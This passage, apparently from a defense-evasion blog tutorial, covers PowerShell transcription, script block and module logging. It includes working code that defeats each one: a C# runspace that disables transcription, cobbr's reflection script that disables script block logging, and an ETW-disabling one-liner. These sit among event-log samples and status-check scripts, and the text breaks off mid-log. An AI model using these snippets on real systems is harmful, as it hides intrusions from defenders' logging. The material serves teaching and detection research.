&#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            runspace.Close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">            rs.Close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></figure>

<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Hello_Bypass.cs # https://avantguard.io/en/blog/powershell-enhanced-logging-capabilities-bypass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation.Runspaces;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Concurrent;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Collections.ObjectModel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CustomRunspace</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">CustomRunspace</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] <span class="keyword">args</span></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Runspace rs = RunspaceFactory.CreateRunspace();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Transcription Logging Bypass</span></span><br><span class="line">            BindingFlags bf = BindingFlags.NonPublic | BindingFlags.Static;</span><br><span class="line">            ConcurrentDictionary&lt;<span class="built_in">string</span>, Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">object</span>&gt;&gt; <span class="keyword">value</span> = (ConcurrentDictionary&lt;<span class="built_in">string</span>, Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">object</span>&gt;&gt;)rs.GetType().Assembly.GetType(<span class="string">&quot;System.Management.Automation.Utils&quot;</span>).GetField(<span class="string">&quot;cachedGroupPolicySettings&quot;</span>, bf).GetValue(<span class="literal">null</span>);</span><br><span class="line">            Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">object</span>&gt; dic = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">object</span>&gt;();</span><br><span class="line">            dic.Add(<span class="string">&quot;EnableTranscripting&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">            <span class="keyword">value</span>.GetOrAdd(<span class="string">&quot;HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription&quot;</span>, dic);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Open Runspace</span></span><br><span class="line">            rs.Open();</span><br><span class="line"></span><br><span class="line">            PowerShell ps = PowerShell.Create();</span><br><span class="line">            ps.Runspace = rs;</span><br><span class="line">            ps.AddCommand(<span class="string">&quot;Write-Output&quot;</span>).AddArgument(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line"></span><br><span class="line">            Collection&lt;PSObject&gt; results = ps.Invoke();</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">var</span> result <span class="keyword">in</span> results)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(result);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            rs.Close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></figure>

<blockquote>
<ul>
<li>Runspace (short for “runtime space”) is an <strong>isolated execution</strong> environment in PowerShell that encapsulates the state and configuration needed to run PowerShell commands or scripts. <strong>It includes session state</strong> (e.g., variables, functions, modules), the PowerShell engine, and the host interface for input&#x2F;output so it allow PowerShell to execute commands in a controlled, isolated manner, supporting both interactive sessions (like powershell.exe) and programmatic execution</li>
<li>you can compile the cs files with this command :</li>
</ul>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\csc.exe /reference:<span class="string">&quot;C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll&quot;</span> /out:Transcription_Bypass.exe CustomRunspace.cs</span><br></pre></td></tr></table></figure></figure><p>{: .prompt-tip }</p>
</blockquote>
<p>Let’s see what we can do</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def29.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<p>So , When we run the hello_world executable the transcription loggin save the commands that in the c# script and the Transcription file created with 53504 Event-ID</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><br><span class="line">- &lt;Event xmlns=<span class="string">&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;</span>&gt;</span><br><span class="line">- &lt;System&gt;</span><br><span class="line">  &lt;Provider Name=<span class="string">&quot;Microsoft-Windows-PowerShell&quot;</span> Guid=<span class="string">&quot;&#123;a0c1853b-5c40-4b15-8766-3cf1c58f985a&#125;&quot;</span> /&gt; </span><br><span class="line">  &lt;EventID&gt;<span class="number">53504</span>&lt;/EventID&gt; </span><br><span class="line">  &lt;Version&gt;<span class="number">1</span>&lt;/Version&gt; </span><br><span class="line">  &lt;Level&gt;<span class="number">4</span>&lt;/Level&gt; </span><br><span class="line">  &lt;Task&gt;<span class="number">111</span>&lt;/Task&gt; </span><br><span class="line">  &lt;Opcode&gt;<span class="number">10</span>&lt;/Opcode&gt; </span><br><span class="line">  &lt;Keywords&gt;<span class="number">0</span>x0&lt;/Keywords&gt; </span><br><span class="line">  &lt;TimeCreated SystemTime=<span class="string">&quot;2025-07-24T01:33:13.9730709Z&quot;</span> /&gt; </span><br><span class="line">  &lt;EventRecordID&gt;<span class="number">57</span>&lt;/EventRecordID&gt; </span><br><span class="line">  &lt;Correlation ActivityID=<span class="string">&quot;&#123;3aa23c01-fc70-0000-906c-a23a70fcdb01&#125;&quot;</span> /&gt; </span><br><span class="line">  &lt;Execution ProcessID=<span class="string">&quot;7140&quot;</span> ThreadID=<span class="string">&quot;3408&quot;</span> /&gt; </span><br><span class="line">  &lt;Channel&gt;Microsoft<span class="literal">-Windows-PowerShell</span>/Operational&lt;/Channel&gt; </span><br><span class="line">  &lt;Computer&gt;DESKTOP<span class="literal">-INN3ESD</span>&lt;/Computer&gt; </span><br><span class="line">  &lt;Security UserID=<span class="string">&quot;S-1-5-21-2346707970-763624724-545999952-1001&quot;</span> /&gt; </span><br><span class="line">  &lt;/System&gt;</span><br><span class="line">- &lt;EventData&gt;</span><br><span class="line">  &lt;<span class="keyword">Data</span> Name=<span class="string">&quot;param1&quot;</span>&gt;<span class="number">7140</span>&lt;/<span class="keyword">Data</span>&gt; </span><br><span class="line">  &lt;<span class="keyword">Data</span> Name=<span class="string">&quot;param2&quot;</span>&gt;DefaultAppDomain&lt;/<span class="keyword">Data</span>&gt; </span><br><span class="line">  &lt;/EventData&gt;</span><br><span class="line">  &lt;/Event&gt;</span><br></pre></td></tr></table></figure></figure>

<p>Let’s run the Bypass script with the same Hello_World function</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def30.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<p>So, the difference here is that there is no log file. Because the new file runs the custom runspace without any transcription log file.</p>
<h3 id="Script-Block-Logging"><a href="#Script-Block-Logging" class="headerlink" title="Script Block Logging"></a>Script Block Logging</h3><p>Records the code executed, including scripts, functions, and commands, whether invoked interactively or through automation.</p>
<p>Let’s configure it from Local Group Policy -&gt; Administrative Templates -&gt; Windows Components -&gt; Windows PowerShell Then navigate to Powershell script block logging</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def31.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<p>Let’s see how this work , you can run this script to know the Script block logging are on or not</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="variable">$scriptBlockLogging</span> = <span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging&quot;</span> <span class="literal">-ErrorAction</span> SilentlyContinue</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$scriptBlockLogging</span> <span class="operator">-and</span> <span class="variable">$scriptBlockLogging</span>.EnableScriptBlockLogging <span class="operator">-eq</span> <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;Script Block Logging is enabled.&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$scriptBlockLogging</span>.EnableScriptBlockInvocationLogging <span class="operator">-eq</span> <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">Write-Host</span> <span class="string">&quot;Script block invocation logging is also enabled.&quot;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">Write-Host</span> <span class="string">&quot;Script block invocation logging is not enabled.&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;Script Block Logging is not enabled.&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></figure>

<p>let’s start and after that start enum the event’s with</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-LogName</span> <span class="string">&quot;Microsoft-Windows-PowerShell/Operational&quot;</span> <span class="literal">-MaxEvents</span> <span class="number">100</span> | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.Id <span class="operator">-eq</span> <span class="number">4104</span> &#125; | <span class="built_in">Select-Object</span> TimeCreated, <span class="selector-tag">@</span>&#123;Name=<span class="string">&quot;ScriptBlock&quot;</span>;Expression=&#123;<span class="variable">$_</span>.Properties[<span class="number">2</span>].Value&#125;&#125; | <span class="built_in">Format-List</span></span><br></pre></td></tr></table></figure></figure>

<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def32.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<blockquote>
<ul>
<li><p>The Script block get the script content not only the input and the output in the prompt</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.robwillis.info/2019/10/everything-you-need-to-know-to-get-started-logging-powershell">PowerShell 5.0 auto logging</a> : By default, PowerShell does not log everything and to get the most out of the logging capabilities there are additional policies that need to be enabled. However, it is worth noting that starting with PowerShell 5.0, anything that is determined as <em><strong>suspicious</strong></em> by AMSI (Antimalware Scan Interface), will automatically log a Script block&#x2F;4104 event with a level of <em><strong>Warning</strong></em>. <a target="_blank" rel="noopener" href="https://web.archive.org/web/20180827195417/https://cobbr.io/ScriptBlock-Warning-Event-Logging-Bypass.html">If script block logging is explicitly disabled, these events will not be logged.</a><br>{: .prompt-info }</p>
</li>
</ul>
</blockquote>
<h4 id="ScriptBlock-Bypass"><a href="#ScriptBlock-Bypass" class="headerlink" title="ScriptBlock Bypass"></a>ScriptBlock Bypass</h4><p>Like the previous bypasses , The user can change his powershell session evniroments and the cached setting so <a target="_blank" rel="noopener" href="https://web.archive.org/web/20190417131155/https://cobbr.io/ScriptBlock-Logging-Bypass.html">cobbr</a> notice that and made this <a target="_blank" rel="noopener" href="https://gist.github.com/cobbr/d8072d730b24fbae6ffe3aed8ca9c407">script</a> for us to disable the scriptblock logging</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="variable">$GroupPolicyField</span> = [<span class="type">ref</span>].Assembly.GetType(<span class="string">&#x27;System.Management.Automation.Utils&#x27;</span>).<span class="string">&quot;GetFie`ld&quot;</span>(<span class="string">&#x27;cachedGroupPolicySettings&#x27;</span>, <span class="string">&#x27;N&#x27;</span>+<span class="string">&#x27;onPublic,Static&#x27;</span>)</span><br><span class="line"><span class="keyword">If</span> (<span class="variable">$GroupPolicyField</span>) &#123;</span><br><span class="line">    <span class="variable">$GroupPolicyCache</span> = <span class="variable">$GroupPolicyField</span>.GetValue(<span class="variable">$null</span>)</span><br><span class="line">    <span class="keyword">If</span> (<span class="variable">$GroupPolicyCache</span>[<span class="string">&#x27;ScriptB&#x27;</span>+<span class="string">&#x27;lockLogging&#x27;</span>]) &#123;</span><br><span class="line">        <span class="variable">$GroupPolicyCache</span>[<span class="string">&#x27;ScriptB&#x27;</span>+<span class="string">&#x27;lockLogging&#x27;</span>][<span class="string">&#x27;EnableScriptB&#x27;</span>+<span class="string">&#x27;lockLogging&#x27;</span>] = <span class="number">0</span></span><br><span class="line">        <span class="variable">$GroupPolicyCache</span>[<span class="string">&#x27;ScriptB&#x27;</span>+<span class="string">&#x27;lockLogging&#x27;</span>][<span class="string">&#x27;EnableScriptBlockInvocationLogging&#x27;</span>] = <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$val</span> = [<span class="type">System.Collections.Generic.Dictionary</span>[<span class="built_in">string</span>,<span class="type">System.Object</span>]]::new()</span><br><span class="line">    <span class="variable">$val</span>.Add(<span class="string">&#x27;EnableScriptB&#x27;</span>+<span class="string">&#x27;lockLogging&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="variable">$val</span>.Add(<span class="string">&#x27;EnableScriptB&#x27;</span>+<span class="string">&#x27;lockInvocationLogging&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="variable">$GroupPolicyCache</span>[<span class="string">&#x27;HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB&#x27;</span>+<span class="string">&#x27;lockLogging&#x27;</span>] = <span class="variable">$val</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></figure>

<p>Then test it with the count of the logs</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-FilterHashtable</span> <span class="selector-tag">@</span>&#123;ProviderName=<span class="string">&quot;Microsoft-Windows-PowerShell&quot;</span>; Id=<span class="number">4104</span>&#125; | <span class="built_in">Measure</span> | % Count</span><br></pre></td></tr></table></figure></figure>

<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def33.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<blockquote>
<p>Our bypass script will still being logged cuz of <a target="_blank" rel="noopener" href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101">Event Tracing for Windows</a> you can use this <a target="_blank" rel="noopener" href="https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32">script here</a> to disable it</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line">[<span class="type">Reflection.Assembly</span>]::LoadWithPartialName(<span class="string">&#x27;System.Core&#x27;</span>).GetType(<span class="string">&#x27;System.Diagnostics.Eventing.EventProvider&#x27;</span>).GetField(<span class="string">&#x27;m_enabled&#x27;</span>,<span class="string">&#x27;NonPublic,Instance&#x27;</span>).SetValue([<span class="type">Ref</span>].Assembly.GetType(<span class="string">&#x27;System.Management.Automation.Tracing.PSEtwLogProvider&#x27;</span>).GetField(<span class="string">&#x27;etwProvider&#x27;</span>,<span class="string">&#x27;NonPublic,Static&#x27;</span>).GetValue(<span class="variable">$null</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure></figure><p>{: .prompt-tip }</p>
</blockquote>
<h3 id="Module-Logging"><a href="#Module-Logging" class="headerlink" title="Module Logging"></a>Module Logging</h3><p>Records pipeline execution details for <span style="color:yellow">cmdlets from specified modules</span>, including variable initialization and command invocations.</p>
<p>Let’s configure it from Local Group Policy -&gt; Administrative Templates -&gt; Windows Components -&gt; Windows PowerShell Then navigate to Module logging</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def34.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>

<p>Let’s see how this work , you can run this script to know the Module logging are on or not</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="variable">$moduleLogging</span> = <span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging&quot;</span> <span class="literal">-ErrorAction</span> SilentlyContinue</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$moduleLogging</span> <span class="operator">-and</span> <span class="variable">$moduleLogging</span>.EnableModuleLogging <span class="operator">-eq</span> <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;Module Logging is enabled.&quot;</span></span><br><span class="line">    <span class="variable">$moduleNames</span> = <span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames&quot;</span> <span class="literal">-ErrorAction</span> SilentlyContinue</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$moduleNames</span>) &#123;</span><br><span class="line">        <span class="built_in">Write-Host</span> <span class="string">&quot;Modules being logged:&quot;</span></span><br><span class="line">        <span class="variable">$moduleNames</span>.PSObject.Properties | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.Name <span class="operator">-ne</span> <span class="string">&#x27;PSPath&#x27;</span> <span class="operator">-and</span> <span class="variable">$_</span>.Name <span class="operator">-ne</span> <span class="string">&#x27;PSParentPath&#x27;</span> &#125; | <span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">            <span class="built_in">Write-Host</span> <span class="string">&quot; - <span class="variable">$</span>(<span class="variable">$_</span>.Name) = <span class="variable">$</span>(<span class="variable">$_</span>.Value)&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">Write-Host</span> <span class="string">&quot;No specific modules are configured for logging.&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;Module Logging is not enabled.&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></figure>

<p>let’s start and after that start enum the event’s with</p>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-LogName</span> <span class="string">&quot;Microsoft-Windows-PowerShell/Operational&quot;</span> <span class="literal">-MaxEvents</span> <span class="number">100</span> | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.Id <span class="operator">-eq</span> <span class="number">4103</span> &#125; | <span class="built_in">Select-Object</span> TimeCreated, <span class="selector-tag">@</span>&#123;Name=<span class="string">&quot;Command&quot;</span>;Expression=&#123;<span class="variable">$_</span>.Properties[<span class="number">1</span>].Value&#125;&#125;, <span class="selector-tag">@</span>&#123;Name=<span class="string">&quot;Module&quot;</span>;Expression=&#123;<span class="variable">$_</span>.Properties[<span class="number">0</span>].Value&#125;&#125; | <span class="built_in">Format-List</span></span><br></pre></td></tr></table></figure></figure>

<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def35.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>



<h4 id="Module-Logging-Bypass"><a href="#Module-Logging-Bypass" class="headerlink" title="Module Logging Bypass"></a>Module Logging Bypass</h4><p>Let’s start with a simple event like print a string with write-host</p>
<figure><figure style="max-width: calc(2600px / var(--device-pixel-ratio))"><picture><source type="image/avif" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><source type="image/webp" srcset="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw"><img src="/images/site/posts/DefenseEvasion/def36.png" width="" height="" srcset="" alt="" sizes="(min-width: 1805px) 1300px, (min-width: 1408px) 1002px, (min-width: 1216px) 858px, (min-width: 1024px) 714px, (min-width: 769px) 75vw, 100vw" loading="lazy"></picture></figure></figure>


<p>This simple command trigger 4 events let’s discribe them</p>
<ul>
<li>PSConsoleHostReadLine : This log appears when you enter the command, as the PSReadLine module handles input reading, providing features like auto-completion and syntax highlighting.</li>
</ul>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><br><span class="line">- &lt;Event xmlns=<span class="string">&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;</span>&gt;</span><br><span class="line">- &lt;System&gt;</span><br><span class="line">  &lt;Provider Name=<span class="string">&quot;Microsoft-Windows-PowerShell&quot;</span> Guid=<span class="string">&quot;&#123;a0c1853b-5c40-4b15-8766-3cf1c58f985a&#125;&quot;</span> /&gt; </span><br><span class="line">  &lt;EventID&gt;<span class="number">4103</span>&lt;/EventID&gt; </span><br><span class="line">  &lt;Version&gt;<span class="number">1</span>&lt;/Version&gt; </span><br><span class="line">  &lt;Level&gt;<span class="number">4</span>&lt;/Level&gt; </span><br><span class="line">  &lt;Task&gt;<span class="number">106</span>&lt;/Task&gt; </span><br><span class="line">  &lt;Opcode&gt;<span class="number">20</span>&lt;/Opcode&gt; </span><br><span class="line">  &lt;Keywords&gt;<span class="number">0</span>x0&lt;/Keywords&gt; </span><br><span class="line">  &lt;TimeCreated SystemTime=<span class="string">&quot;2025-07-20T23:17:27.8187082Z&quot;</span> /&gt; </span><br><span class="line">  &lt;EventRecordID&gt;<span class="number">285</span>&lt;/EventRecordID&gt; </span><br><span class="line">  &lt;Correlation ActivityID=<span class="string">&quot;&#123;188710b5-f9b6-0000-6a3a-8718b6f9db01&#125;&quot;</span> /&gt; </span><br><span class="line">  &lt;Execution ProcessID=<span class="string">&quot;2236&quot;</span> ThreadID=<span class="string">&quot;7736&quot;</span> /&gt; </span><br><span class="line">  &lt;Channel&gt;Microsoft<span class="literal">-Windows-PowerShell</span>/Operational&lt;/Channel&gt; </span><br><span class="line">  &lt;Computer&gt;DESKTOP<span class="literal">-47K3P38</span>&lt;/Computer&gt; </span><br><span class="line">  &lt;Security UserID=<span class="string">&quot;S-1-5-21-3540393959-771636146-431249527-1001&quot;</span> /&gt; </span><br><span class="line">  &lt;/System&gt;</span><br><span class="line">- &lt;EventData&gt;</span><br><span class="line">  &lt;<span class="keyword">Data</span> Name=<span class="string">&quot;ContextInfo&quot;</span>&gt;Severity = Informational Host Name = ConsoleHost Host Version = <span class="number">5.1</span>.<span class="number">19041.2673</span> Host ID = <span class="number">80</span>aae10f<span class="literal">-5d8d-48fd-ad14-389df84528c7</span> Host Application = C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe Engine Version = <span class="number">5.1</span>.<span class="number">19041.2673</span> Runspace ID = c5b9897e<span class="literal">-6c29-42d0-a784-bc369f276c7e</span> Pipeline ID = <span class="number">17</span> Command Name = PSConsoleHostReadLine Command <span class="built_in">Type</span> = <span class="function"><span class="keyword">Function</span> <span class="title">Script</span> <span class="title">Name</span> = <span class="title">Command</span> <span class="title">Path</span> = <span class="title">Sequence</span> <span class="title">Number</span> = <span class="title">46</span> <span class="title">User</span> = <span class="title">DESKTOP-47K3P38</span>\<span class="title">3atef</span> <span class="title">Connected</span> <span class="title">User</span> = <span class="title">Shell</span> <span class="title">ID</span> = <span class="title">Microsoft</span>.<span class="title">PowerShell</span>&lt;/<span class="title">Data</span>&gt; </span></span><br><span class="line">  &lt;<span class="keyword">Data</span> Name=<span class="string">&quot;UserData&quot;</span> /&gt; </span><br><span class="line">  &lt;<span class="keyword">Data</span> Name=<span class="string">&quot;Payload&quot;</span>&gt;CommandInvocation(PSConsoleHostReadLine): <span class="string">&quot;PSConsoleHostReadLine&quot;</span>&lt;/<span class="keyword">Data</span>&gt; </span><br><span class="line">  &lt;/EventData&gt;</span><br><span class="line">  &lt;/Event&gt;</span><br></pre></td></tr></table></figure></figure>

<ul>
<li>Write-Host : This directly logs the command you executed, showing the invocation and the parameter “@N1NJ10 was here”.</li>
</ul>
<figure class="my-table"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><br><span class="line">- &lt;Event xmlns=<span class="string">&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;</span>&gt;</span><br><span class="line">- &lt;System&gt;</span><br><span class="line">  &lt;Provider Name=<span class="string">&quot;Microsoft-Windows-PowerShell&quot;</span> Guid=<span class="string">&quot;&#123;a0c1853b-5c40-4b15-8766-3cf1c58f985a&#125;&quot;</span> /&gt; </span><br><span class="line">  &lt;EventID&gt;<span class="number">4103</span>&lt;/EventID&gt; </span><br><span class="line">  &lt;Version&gt;<span class="number">1</span>&lt;/Version&gt; </span><br><span class="line">  &lt;Level&gt;<span class="number">4</span>&lt;/Level&gt; </span><br><span class="line">  &lt;Task&gt;<span class="number">106</span>&lt;/Task&gt; </span><br><span class="line">  &lt;Opcode&gt;<span class="number">20</span>&lt;/Opcode&gt; </span><br><span class="line">  &lt;Keywords&gt;<span class="number">0</span>x0&lt;/Keywords&gt; </span><br><span class="line">  &lt;TimeCreated SystemTime=<span class="string">&quot;2025-07-20T23:17:27.8234848Z&quot;</span> /&gt; </span><br><span class="line">  &lt;EventRecordID&gt;<span class="number">286</span>&lt;/EventRecordID&gt; </span><br><span class="line">  &lt;Correlation ActivityID=<span class="string">&quot;&#123;188710b5-f9b6-0002-d13b-8718b6f9db01&#125;&quot;</span> 